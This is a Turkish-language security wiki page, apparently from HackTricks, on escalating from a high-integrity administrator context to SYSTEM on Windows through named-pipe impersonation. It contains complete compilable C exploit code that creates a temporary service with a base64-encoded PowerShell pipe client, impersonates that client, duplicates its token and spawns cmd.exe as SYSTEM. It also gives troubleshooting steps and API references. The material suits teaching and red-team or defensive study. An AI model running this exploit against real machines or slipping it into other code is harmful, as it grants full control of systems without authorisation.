# Name Pipes ile High Integrity'den SYSTEM'e

{{#include ../../banners/hacktricks-training.md}}

Bu, named-pipe impersonation'ın **administrator/SCM varyantıdır**: elevated bir process, child process'i `SYSTEM` olarak bağlanan geçici bir service oluşturur ve ardından bu client'ı impersonate eder. Başlangıç context'i service oluşturamıyor ancak `SeImpersonatePrivilege` içeriyorsa bunun yerine privileged-service coercion kullanın; [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) ve [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md) bölümlerine bakın. Service'i oluşturmak SCM erişimi ve yeni service üzerinde `SERVICE_START` erişimi gerektirirken, `CreateProcessWithTokenW` `SeImpersonatePrivilege` gerektirir.<sup>[[2]](#references)[[3]](#references)</sup>

Beklenen başlangıç context'ini hızlıca doğrulayın:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Kod akışı:**

1. Named-pipe server'ı hizmeti başlatmadan **önce** oluşturun. Beklerken, `ConnectNamedPipe` çağrısının `FALSE` döndürüp `ERROR_PIPE_CONNECTED` vermesini başarı olarak değerlendirin: bu, istemcinin yarışı kazandığı ve `CreateNamedPipe` ile `ConnectNamedPipe` arasında bağlandığı anlamına gelir.<sup>[[4]](#references)</sup>
2. Oluşturulan pipe'a bağlanıp bir şey yazacak bir hizmet oluşturun ve başlatın. Hizmet kodu, şu kodlanmış PS kodunu çalıştırır: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Hizmet bağlanıp yazma işlemini gerçekleştirdikten sonra `ImpersonateNamedPipeClient` çağrısını yapın, ortaya çıkan thread token'ını açın ve bunu bir primary token olarak çoğaltın.<sup>[[1]](#references)</sup>
4. Bu primary token'ı kullanarak `cmd.exe` oluşturun.<sup>[[2]](#references)</sup>

Bu yöntem, çağıranın bir hizmet oluşturup başlatabildiğini ve `CreateProcessWithTokenW` için gereken ayrıcalıklara (genellikle `SeImpersonatePrivilege`) sahip olduğunu varsayar. Bu, bir high-integrity-to-SYSTEM tekniğidir; rastgele düşük ayrıcalıklı bir kullanıcıya sunulan bir primitive değildir.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Hizmet oluşturma/başlatma başarısız olursa örnek pipe thread'ine sinyal göndermez ve süresiz olarak bekleyebilir. Laboratuvar dışında kullanmadan önce hata işleme ve overlapped pipe timeout ekleyin. Ayrıca çakışmaları önlemek için rastgele bir pipe/hizmet adı kullanın.

`ImpersonateNamedPipeClient`, **son okunan mesajla** ilişkilendirilmiş bağlamı benimser; bu nedenle yalnızca bağlantı kurulması yeterli değildir: ayrıcalıklı istemcinin yazmasını sağlayın, `ReadFile` çağrısının veri döndürdüğünü doğrulayın ve yalnızca bundan sonra impersonate edin. Thread impersonation token'ını `SecurityImpersonation` ile `TokenPrimary` token'ına çoğaltın; process-creation API'sinin kullandığı token türü primary token'dır.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Hata ayıklama

- `ConnectNamedPipe == FALSE` with `ERROR_PIPE_CONNECTED`: devam edin; pipe zaten bağlıdır.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` fails with `ERROR_CANNOT_IMPERSONATE` (`1368`): SYSTEM client'ının gerçekten veri yazdığını ve `ReadFile` işleminin tamamlandığını doğrulayın. Ayrıca client tarafından istenen impersonation level'ı inceleyin; identification/anonymous-level client'lar tamamen impersonate edilemez.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` fails with `ERROR_PRIVILEGE_NOT_HELD` (`1314`): original caller `SeImpersonatePrivilege` ayrıcalığına sahip değildir. High-integrity administrator context'ten, [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) içinde belgelenen token-copy route'u kullanın veya gerekli ayrıcalıklar mevcutsa SYSTEM'i impersonate ederken `CreateProcessAsUserW` kullanın.<sup>[[2]](#references)</sup>
- `CreateServiceA` returns `ERROR_SERVICE_EXISTS` (`1073`): eski `PiperSrv` entry'sini silin veya `PIPESRV` değerini rastgele hale getirin; trigger'dan sonra temporary service'i her zaman silin.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
